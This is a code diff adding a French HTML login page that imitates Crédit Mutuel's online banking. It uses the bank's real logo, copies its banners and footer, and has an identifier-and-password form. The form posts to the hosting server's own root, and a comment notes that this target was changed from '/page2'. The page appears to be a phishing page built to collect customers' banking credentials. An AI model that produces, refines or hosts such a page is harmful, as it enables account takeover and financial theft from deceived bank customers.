@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Connexion - Crédit Mutuel</title>
+<style>
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #f7f9fc;
+    margin: 0;
+    color: #0a1f47;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  header {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    background: white;
+    padding: 12px 30px;
+    box-shadow: 0 1px 6px rgba(0,0,0,0.12);
+    display: flex;
+    align-items: center;
+    z-index: 1000;
+  }
+  header img {
+    height: 44px;
+  }
+  main {
+    margin-top: 80px;
+    padding: 30px 40px;
+    max-width: 460px;
+    margin-left: auto;
+    margin-right: auto;
+    flex: 1;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+  }
+  .info-banner {
+    background: #d9e7ff;
+    color: #0a1f47;
+    font-size: 15px;
+    padding: 20px 25px;
+    border-left: 5px solid #0a1f47;
+    border-radius: 6px;
+    margin-bottom: 35px;
+    line-height: 1.5;
+  }
+  h1 {
+    text-align: center;
+    font-size: 32px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    letter-spacing: 0.03em;
+  }
+  label {
+    display: block;
+    font-weight: 700;
+    margin-bottom: 8px;
+    font-size: 16px;
+  }
+  .required-star {
+    color: #d92e35;
+    margin-left: 5px;
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 14px 50px 14px 15px;
+    font-size: 17px;
+    border: 1.5px solid #cbd7ef;
+    border-radius: 12px;
+    margin-bottom: 30px;
+    box-sizing: border-box;
+    color: #0a1f47;
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+  input::placeholder {
+    color: #6b7a99;
+  }
+  input:focus {
+    border-color: #0a1f47;
+    outline: none;
+    box-shadow: 0 0 10px #0a1f4780;
+  }
+  .password-wrapper {
+    position: relative;
+  }
+  .toggle-password {
+    position: absolute;
+    top: 50%;
+    right: 15px;
+    transform: translateY(-50%);
+    cursor: pointer;
+    font-size: 20px;
+    color: #6b7a99;
+    user-select: none;
+    transition: color 0.3s;
+  }
+  button {
+    width: 100%;
+    background-color: #8a94a9;
+    border: none;
+    padding: 18px;
+    border-radius: 12px;
+    color: white;
+    font-weight: 700;
+    font-size: 19px;
+    cursor: not-allowed;
+    opacity: 0.7;
+    transition: opacity 0.3s, background-color 0.3s;
+  }
+  button.enabled {
+    cursor: pointer;
+    opacity: 1;
+    background-color: #0a1f47;
+  }
+  button.enabled:hover {
+    background-color: #061436;
+  }
+  .help-links {
+    margin-top: 28px;
+    text-align: center;
+  }
+  .help-links a {
+    display: block;
+    color: #0a1f47;
+    font-weight: 700;
+    text-decoration: none;
+    margin-bottom: 14px;
+    font-size: 16px;
+    transition: color 0.3s;
+  }
+  .help-links a:hover {
+    text-decoration: underline;
+    color: #054371;
+  }
+  .tip-banner {
+    margin-top: 38px;
+    background: #e4edff;
+    border-left: 5px solid #7390bf;
+    padding: 18px 25px;
+    border-radius: 6px;
+    color: #0a1f47;
+    font-weight: 700;
+    text-align: center;
+    font-size: 16px;
+    letter-spacing: 0.02em;
+  }
+  .tip-banner a {
+    color: #0a1f47;
+    text-decoration: underline;
+    font-weight: 700;
+  }
+  footer {
+    background-color: #003366;
+    color: white;
+    font-size: 15px;
+    padding: 40px 20px 50px;
+    text-align: center;
+  }
+  footer a {
+    color: #8cc7ff;
+    text-decoration: none;
+    margin: 0 12px;
+    font-weight: 700;
+    font-size: 15px;
+  }
+  footer a:hover {
+    text-decoration: underline;
+  }
+  footer .footer-top,
+  footer .footer-bottom {
+    max-width: 480px;
+    margin: 0 auto 24px;
+  }
+  footer .social-icons {
+    margin-top: 20px;
+  }
+  footer .social-icons a {
+    margin: 0 14px;
+    font-size: 22px;
+    vertical-align: middle;
+    font-weight: 700;
+    color: #8cc7ff;
+  }
+  footer .social-icons a:hover {
+    color: #bfdcff;
+  }
+  @media (max-width: 480px) {
+    main {
+      margin: 20px 10px 30px;
+      padding: 25px 15px 30px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <img src="https://cdnsi.e-i.com/INGR/sd/cm_2023/7.122.4/fr/images/css/env/logo.svg" alt="Logo Crédit Mutuel" />
+</header>
+
+<main>
+  <div class="info-banner">
+    Site allégé, navigation simplifiée et design épuré : nous avons repensé notre site web pour mieux vous servir ! <a href="#" style="color:#0a1f47;">En savoir plus</a>
+  </div>
+
+  <h1>Se connecter</h1>
+
+  <!-- CORRECTION ICI : action="/" au lieu de "/page2" -->
+  <form id="loginForm" method="POST" action="/">
+    <label for="identifiant">Identifiant<span class="required-star">*</span></label>
+    <input type="text" id="identifiant" name="identifiant" autocomplete="username" required />
+
+    <label for="password">Mot de passe<span class="required-star">*</span></label>
+    <div class="password-wrapper">
+      <input type="password" id="password" name="password" placeholder="Tapez votre mot de passe" autocomplete="current-password" required />
+      <span id="togglePassword" class="toggle-password" aria-label="Afficher ou masquer le mot de passe">&#128065;</span>
+    </div>
+
+    <button type="submit" id="submitBtn" disabled>Se connecter</button>
+  </form>
+
+  <div class="help-links">
+    <a href="#">Codes d'accès oubliés →</a>
+    <a href="#">Infos sécurité →</a>
+  </div>
+
+  <div class="tip-banner">
+    Astuce : <a href="#">Nos conseils pour sécuriser vos opérations et données.</a>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-top">
+    <a href="#">Centre d'aide</a> | <a href="#">Trouver une caisse</a> | <a href="#">Sourds et malentendants</a><br/>
+    <button style="margin: 20px 0 25px; padding: 12px 30px; border:none; border-radius:6px; background:#8cc7ff; color:#0a1f47; font-weight:700; cursor:pointer;">Télécharger l'application</button>
+    <p style="margin-bottom: 15px;">Parrainez un proche et profitez ensemble d’avantages — <a href="#">Découvrir notre offre →</a></p>
+    <p>Abonnez-vous à notre newsletter pour ne rien manquer de nos actualités.</p>
+    <input type="email" placeholder="Votre adresse e-mail" style="padding: 12px; width: 85%; max-width: 320px; border-radius: 8px; border: 1px solid #cbd7ef; margin-top: 6px; font-size: 15px;">
+    <button style="margin-top: 14px; padding: 12px 30px; border:none; border-radius:8px; background:#0a1f47; color:#fff; font-weight:700; cursor:pointer; font-size: 16px;">Valider</button>
+  </div>
+  <div class="footer-bottom">
+    <p style="margin-bottom: 20px; line-height: 1.6;">
+      <a href="#">Mentions légales</a> |
+      <a href="#">Tarifs et conditions générales</a> |
+      <a href="#">Guides et informations réglementaires</a> |
+      <a href="#">Protection des données</a> |
+      <a href="#">Gestion des cookies</a> |
+      <a href="#">Fraude et sécurité bancaire</a> |
+      <a href="#">VDP</a> |
+      <a href="#">Accessibilité</a> |
+      <a href="#">Déclaration d’accessibilité : partiellement conforme</a>
+    </p>
+    <p style="font-weight: 700; font-size: 18px; letter-spacing: 0.02em;">
+      Crédit Mutuel<br>
+      Une banque qui appartient à ses clients, ça change tout.
+    </p>
+    <div class="social-icons" aria-label="Réseaux sociaux">
+      <a href="#" aria-label="Twitter">X</a>
+      <a href="#" aria-label="Facebook">Facebook</a>
+      <a href="#" aria-label="Instagram">Instagram</a>
+      <a href="#" aria-label="YouTube">YouTube</a>
+      <a href="#" aria-label="LinkedIn">LinkedIn</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+  const identifiant = document.getElementById("identifiant");
+  const password = document.getElementById("password");
+  const submitBtn = document.getElementById("submitBtn");
+  const togglePassword = document.getElementById("togglePassword");
+
+  function updateButtonState() {
+    if (identifiant.value.trim() !== "" && password.value.trim() !== "") {
+      submitBtn.disabled = false;
+      submitBtn.classList.add("enabled");
+    } else {
+      submitBtn.disabled = true;
+      submitBtn.classList.remove("enabled");
+    }
+  }
+
+  identifiant.addEventListener("input", updateButtonState);
+  password.addEventListener("input", updateButtonState);
+
+  togglePassword.addEventListener("click", () => {
+    if (password.type === "password") {
+      password.type = "text";
+      togglePassword.style.color = "#0a1f47";
+    } else {
+      password.type = "password";
+      togglePassword.style.color = "#6b7a99";
+    }
+  });
+
+  updateButtonState(); // Initialize button state on load
+</script>
+
+</body>
+</html>
